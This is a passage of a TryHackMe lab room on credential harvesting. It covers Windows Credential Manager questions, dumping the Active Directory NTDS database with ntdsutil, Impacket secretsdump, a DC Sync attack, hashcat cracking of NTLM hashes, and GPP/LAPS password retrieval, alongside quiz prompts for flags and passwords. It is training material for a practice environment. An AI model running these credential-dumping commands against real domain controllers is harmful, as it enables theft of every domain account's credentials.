</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Apply this technique to the attached machine and answer the question below.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">The techniques discussed in this task also could be done through other tools such as Empire, Metasploit, etc. You can do your own research to expand your knowledge.<br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red?
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ************" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="6" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <i class="fal fa-lightbulb" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ****************" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="6" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <i class="fal fa-lightbulb" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag?
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{**************}" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="3" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="6" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse7" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 7                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Domain Controller
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible">This task discusses the required steps to&nbsp;dump Domain Controller Hashes locally and remotely.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">NTDS Domain Controller</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.DTS data consists of three tables as follows:</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Schema table: it contains types of objects and their relationships.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Link table: it contains the object's attributes and their values.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Data type: It contains users and groups.</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible"> NTDS is located in<code data-pf_style_display="inline-block" data-pf_style_visibility="visible"> C:\Windows\NTDS</code> by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. However, there are various ways to gain access to it. This task will discuss how to get a copy of the NTDS file using the&nbsp;ntdsutil and Diskshadow tool and finally how to dump the file's content. It is important to note that decrypting the NTDS file requires a system Boot Key to attempt to decrypt LSA Isolated credentials, which is stored in the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">SECURITY</code>&nbsp;file system. Therefore, we must also dump the security file containing all required files to decrypt.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Ntdsutil</span><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios such as&nbsp;</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Restore deleted objects in Active Directory.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Perform maintenance for the AD database.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Active Directory snapshot management.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Set Directory Services Restore Mode (DSRM) administrator passwords.</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible">For more information about Ntdsutil, you may visit the Microsoft documentation <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">page</a>.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Local Dumping (No Credentials)</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">This is usually done if you have no credentials available but have administrator access to the domain controller.&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller.&nbsp;</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">To successfully dump the content of the NTDS file we need the following files:</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible">C:\Windows\NTDS\ntds.dit</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">C:\Windows\System32\config\SYSTEM</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">C:\Windows\System32\config\SECURITY</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible">The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">C:\temp</code> directory.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Dumping the content of the NTDS file from the Victim Machine</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">Now, if we check the </span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">c:\temp</code> directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible"></span></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Extract hashes from NTDS Locally</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token info punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token user" data-pf_style_display="inline" data-pf_style_visibility="visible">user@machine</span></span><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span> <span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit <span class="token builtin class-name" data-pf_style_display="inline" data-pf_style_visibility="visible">local</span></span></span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Remote Dumping (With Credentials)</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">In the previous section, we discussed how to get hashes from memory with no credentials in hand.&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">In this task, we will be showing how to dump a system and domain controller hashes remotely, which requires credentials, such as passwords or NTLM hashes. We also need credentials for users with administrative access to a domain controller or special permissions as discussed in the DC Sync section.</span></p>

<p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">DC Sync</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">The DC Sync is a popular attack to perform within an Active Directory environment to dump credentials remotely. This attack works when an account (special account with necessary permissions) or AD admin account is compromised that has the following AD permissions:</span></p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Replicating Directory Changes</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Replicating Directory Changes All</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Replicating Directory Changes in Filtered Set<span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible"><br data-pf_style_display="inline" data-pf_style_visibility="visible"></span></li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible">An adversary takes advantage of these configurations to perform domain replication,&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">commonly referred to as "DC Sync", or Domain Controller Sync. For more information about the DC Sync attack, you can visit the THM&nbsp;</span><a href="https://tryhackme.com/room/persistingad" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Persisting AD</a> room (Task 2).</p><p data-pf_style_display="block" data-pf_style_visibility="visible">The Persisting AD room uses the Mimikatz tool to perform the DC Synchronisation attack. Let's demonstrate the attack using a different tool, such as&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">the Impacket SecretsDump script.</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Performing the DC Sync Attack</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token info punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token user" data-pf_style_display="inline" data-pf_style_visibility="visible">user@machine</span></span><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span> <span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/</span></span><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">&lt;AD_Admin_User&gt;@MACHINE_IP 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>

<p data-pf_style_display="block" data-pf_style_visibility="visible">Let's explain the command a bit more.</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible">the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-just-dc</code> argument is for extracting the NTDS data.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">thm.red/AD_Admin_User</code> is the authenticated domain user in the form of (domain/user).</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible">Note if we are interested to dump only the NTLM hashes, then we can use the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-just-dc-ntlm</code> argument as follows,</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            The DC Sync Attack to Dump NTLM Hashes</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token info punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token user" data-pf_style_display="inline" data-pf_style_visibility="visible">user@machine</span></span><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span> <span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/</span></span><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">&lt;AD_Admin_User&gt;@MACHINE_IP</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">hashcat</code>. We can use the hashcat&nbsp;<code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-m 1000</code> mode to crack the Windows NTLM hashes as follows:</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Performing the DC Sync Attack</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token info punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token user" data-pf_style_display="inline" data-pf_style_visibility="visible">user@machine</span></span><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span> <span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">hashcat -m <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">1000</span> -a <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span>  /path/to/wordlist/such/as/rockyou.txt</span></span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
</div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                Apply the technique discussed in this task to dump the NTDS file <b data-pf_style_display="inline" data-pf_style_visibility="visible">locally </b>and extract hashes. What is the target system bootkey value? <b data-pf_style_display="inline" data-pf_style_visibility="visible">Note</b>: Use thm.red/thm as an Active Directory user since it has administrator privileges!
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **********************************" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="7" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <i class="fal fa-lightbulb" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">What is the clear-text password for the&nbsp;<b data-pf_style_display="inline" data-pf_style_visibility="visible">bk-admin</b> username?</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***********" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="7" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse8" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 8                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Local Administrator Password Solution (LAPS)
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse8" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p style="line-height:1" data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">This task discusses how to enumerate and obtain a local administrator password within the Active Directory environment if a LAPS feature is configured and enabled.</span></span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Group Policy Preferences (GPP)</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">A Windows OS has a built-in Administrator account which can be accessed using a password. Changing passwords in a large Windows environment with many computers is challenging. Therefore, Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences (GPP).</p><p data-pf_style_display="block" data-pf_style_visibility="visible">GPP is a tool that allows administrators to create domain policies with embedded credentials.&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">The issue was the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">MSDN</a>. Since Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is&nbsp;<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Get-GPPPassword</a>.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Local Administrator Password Solution (LAPS)</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime) of computer objects in the Active Directory.&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">The <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">ms-mcs-AdmPwd</code> attribute contains a clear-text password of the local administrator, while the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">ms-mcs-AdmPwdExpirationTime</code> contains the expiration time to reset the password. LAPS uses <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">admpwd.dll</code> to change the local administrator password and update the value of <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">ms-mcs-AdmPwd</code>.</span></p><p style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><img src="./TryHackMe _ Credentials Harvesting_files/ecdb1fcaee158d79297978a49d52b9dd.png" alt="Computer Objects Attributes" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="460" data-pf_rect_height="528" class="pf-large-image"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"><br data-pf_style_display="inline" data-pf_style_visibility="visible"></span></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Enumerate for LAPS</span></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">The provided VM has the LAPS enabled, so let's start enumerating it. First,&nbsp;we check if LAPS is installed in the target machine, which can be done by checking the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">admpwd.dll</code> path.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Enumerating for LAPS
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">C:\Users\thm&gt;dir "C:\Program Files\LAPS\CSE"
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

06/06/2022  01:01 PM              .
06/06/2022  01:01 PM              ..
05/05/2021  07:04 AM           184,232 AdmPwd.dll
               1 File(s)        184,232 bytes
               2 Dir(s)  10,306,015,232 bytes free</span></code>
        </pre>
    </div>
</div>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">The output confirms that we have LAPS on the machine. Let's check the available commands to use for <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">AdmPwd</code> cmdlets as follows,</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Listing the available PowerShell cmdlets for LAPS
        </div>
